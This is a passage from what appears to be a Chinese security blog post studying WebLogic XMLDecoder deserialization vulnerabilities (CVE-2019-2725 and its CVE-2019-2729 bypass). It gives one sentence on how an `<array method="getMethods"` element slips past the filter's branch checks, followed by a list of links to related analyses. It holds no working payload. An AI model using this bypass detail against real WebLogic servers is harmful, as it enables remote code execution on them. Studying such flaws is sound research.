
![image-20221017174557960](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017174557960.png)

传入`<array method="getMethods"`，method不等于预设的if中任意一种，而且target也不是Class.class，进入上图中最后一个if(m==null)，满足我们的要求

----

{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（" %}}

[WebLogic 安全研究报告](https://paper.seebug.org/1012/)

[Weblogic XMLDecoder RCE分析](https://paper.seebug.org/487/)

[WebLogic RCE(CVE-2019-2725)漏洞之旅](https://paper.seebug.org/909/)

[\# CVE-2019-2725二次反序列化EventData Gadget POC/JdbcRowSetImpl POC构造](https://www.cnblogs.com/afanti/p/10816028.html)

[cve-2019-2729挖掘思路 - cve-2019-2725 bypass](https://xz.aliyun.com/t/5448)

[weblogic反序列化漏洞学习记录](http://moonflower.fun/index.php/2022/01/30/251/)

{{% /spoiler %}}
